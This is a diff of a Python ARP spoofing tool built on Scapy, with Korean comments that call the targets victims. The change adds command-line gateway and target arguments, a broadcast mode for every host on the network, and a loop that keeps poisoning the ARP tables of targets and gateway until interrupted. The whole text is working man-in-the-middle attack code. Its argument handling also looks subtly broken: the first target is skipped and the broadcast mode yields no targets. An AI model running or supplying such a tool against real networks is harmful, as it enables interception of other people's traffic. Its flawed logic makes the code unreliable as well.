@@ -1,7 +1,7 @@
 # ARP Spoofing Program
 # Update : 2023-12-10
-# Version : 1.0.0
 # Python Ver : 3.12.0
+VERSION = "1.0.0"
 
 # Import Library
 from scapy.all import * #enables the user to send, sniff, dissect and forge network packets
@@ -55,34 +55,63 @@ def restoreARP(target_ip:str, target_mac:str, gateway_ip:str, gateway_mac:str) -
 
 # main
 def main(*args, **kwargs) -> int:
-    argc = kwargs.get("argc", 0)
+    argc = kwargs.get("argc", 0) - 1
     argv = kwargs.get("argv", None)
     
     
-    gateway_ip ="163.152." # 게이트웨이 IP
-    target_ip ="163.152." # 희생자 IP
+    if argc >= 2 and not ("--multiple" in argv or "-m" in argv):
+        target_ip = argv[2] # 희생자 IP
+        
+    elif argc == 2 and (argv[1] == "--multiple" or argv[1] == "-m"):
+        target_ip = "255.255.255.255" # Broadcast IP
+    
+    else:
+        print(f"ARP Spoofing Program {VERSION}\n")
+        print(f"usage: {argv[0]} [options] [<args>]\n")
+        print("Options:")
+        print("   <new gateway ip> <target ip 1> [<target ip 2> ..]   ARP Spoofing")
+        print("   -m --multiple <new gateway ip>                      ARP Spoofing for all network targets")
+        print("   -h --help                                           Show this help message and exit")
+        return 0
+    
+    gateway_ip = argv[1] # 게이트웨이 IP
+    target_ips = [] # 희생자 IP 리스트
+    for ip in argv[3:]:
+        target_ips.append(ip)
 
     # IP 주소로 MAC 주소를 알아낸다
-    target_mac = getMAC(target_ip)
     gateway_mac = getMAC(gateway_ip)
+    target_macs = []
+    for ip in target_ips:
+        target_macs.append(getMAC(ip))
     
     # MAC 주소를 찾을 수 없으면 종료
-    if target_mac == None or gateway_mac == None: 
-        print('MAC 주소를 찾을 수 없습니다')
-        return -1
+    if gateway_mac == None: 
+        print('Gateway MAC 주소를 찾을 수 없습니다')
+    for mac in target_macs:
+        if mac == None:
+            print('Target MAC 주소를 찾을 수 없습니다')
+            return -1
 
-    print(f"ARP Spoofing 시작 -> VICTIM IP [{target_ip}]")
-    print(f"[{target_ip}]:POISON ARP Table [{gateway_mac}] -> [{target_mac}]")
-
-    try: # KeyboardInterrupt 발생 전까지 ARP Spoofing을 계속한다.
-        while True:
-            poisonARP(gateway_ip, target_ip, target_mac)
-            poisonARP(target_ip, gateway_ip, gateway_mac)
-            sleep(3)
-    except KeyboardInterrupt:
-        restoreARP(target_ip, target_mac, gateway_ip, gateway_mac)
-        print("ARP Spoofing 종료 -> RESTORED ARP table")
+    # ARP Spoofing 시작
+    for target_ip, target_mac in zip(target_ips, target_macs):
+        print(f"ARP Spoofing 시작 -> VICTIM IP [{target_ip}]")
+        print(f"[{target_ip}]: POISON ARP Table [{gateway_mac}] -> [{target_mac}]")
+        poisonARP(gateway_ip, target_ip, target_mac)
+        poisonARP(target_ip, gateway_ip, gateway_mac)
         
+    try: # KeyboardInterrupt 발생 전까지 5초마다 ARP Spoofing을 계속한다.
+        while True:
+            for target_ip, target_mac in zip(target_ips, target_macs):
+                poisonARP(gateway_ip, target_ip, target_mac)
+                poisonARP(target_ip, gateway_ip, gateway_mac)
+                sleep(5)
+    except KeyboardInterrupt:
+        for target_ip, target_mac in zip(target_ips, target_macs):
+            restoreARP(target_ip, target_mac, gateway_ip, gateway_mac)
+            print(f"[{target_ip}]: RESTORE ARP Table [{target_mac}] -> [{gateway_mac}]")
+            
+    print("ARP Spoofing 종료 완료")
     return 0
 
 
